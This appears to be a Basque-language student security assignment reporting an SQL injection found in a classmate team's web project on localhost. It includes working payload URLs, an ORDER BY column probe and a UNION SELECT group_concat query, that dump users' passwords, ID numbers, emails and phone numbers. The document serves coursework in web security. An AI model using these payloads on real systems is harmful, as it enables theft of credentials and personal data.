# 4. entrega: Web Sistemari erasoa

Dokumentu honetan egindako web sistemaren erasoari buruzko analisia dokumentatuko dugu.

---

## “Biktima” proiektuaren URL-a

* **Github-eko URL:** `https://github.com/aneemoreeno1/ISSKSproiektua.git`
* **Erasotako branch-a:** `entrega_1`
* **Erasotako taldea:** `Lankideak`

---

## Erasoari buruzko azalpena
Batez ere erabilitako ahultasuna azalduz.

### Aurkitutako ahultasuna

|  |  |
| :--- | :--- |
| **Ahultasuna** | **SQL injekzioa** |
| **Arriskua** | Altua |
| **Non ematen da** | `GET: http://localhost:81/show_user?user=5-2` |
| **Informazioa** | `Web orrialdeko balio originalak erreplikatu dira [5-2] espresioa parametro baliotzat erabiliz.`|
| **Zergatik ematen da** | SQL injekzio-alerta bat ematen da web orrialdea ez dituelako behar bezala baliozkotzen fidagarriak ez diren iturrietatik datozen datuak.|
| **Zergatik da arriskutsua** | Arriskutsua da datu basearen edozein datu lortu dezakegulako ahulezi honekin, eta ondorioz, erabiltzaileen segurtasuna ez da existitzen. Ahulezi honekin, datua eraldatu, ezabatu eta lapurtu daitezke.|

---

## Erasoa berregiteko azalpena
Ahulezia ikusita, inpaktu handien duen erasoa datuen eraldaketa edota lapurketa da. Izan ere, datuak aldatuz gero, erabiltzaileak ezingo da kontuan sartu.
Hala ere, arazo larriena pasahitzen lapurketa izan daiteke. Pasahitzak, nan zenbakia, email kontuak eta telefono zenbakiak izanda kalte handia sor dezake erasotzaile batek. Izan ere, gehienetan erabiltzaileek pasahitz berdinak erabiltzen dituzte hainbat lekutan, eta erasotzaileak ez luke soilik web orri honen datuak lortuko, baizik eta pribatuagoak diren hainbat lekutako datuak ere.

### Erabilitako tresnak
Web nabigatzailea.

### Prosezua

1.  **Zutabeen identifikazioa:** `ORDER BY` erabiliz datu basean gordetzen den datu kopurua lor dezakegu. `ORDER BY N + 1` helbidearen ondoren jartzen badugu, non N zutabe kopurua den, web orrian errore bat emango digu. Kasu honetan 7 datu daude user bakoitzarentzat, beraz, `http://localhost:81/show_user?user=-1%20ORDER%20BY%208` nabigatzailean jarriz, errore bat agertuko zaigu.
2.  **:** `http://localhost:81/show_user?user=-1%20UNION%20SELECT%20group_concat(pasahitza%20SEPARATOR%20%27|%27),%20group_concat(nombre%20SEPARATOR%20%27|%27),%20group_concat(nan%20SEPARATOR%20%27|%27),%20group_concat(telefonoa%20SEPARATOR%20%27|%27),%20group_concat(jaiotze_data%20SEPARATOR%20%27|%27),%20group_concat(email%20SEPARATOR%20%27|%27),%20group_concat(pasahitza%20SEPARATOR%20%27|%27)%20FROM%20usuarios` jarriz gero id atalean pasahitzak agertuko dira eta beste datu guztiak bere atalean.
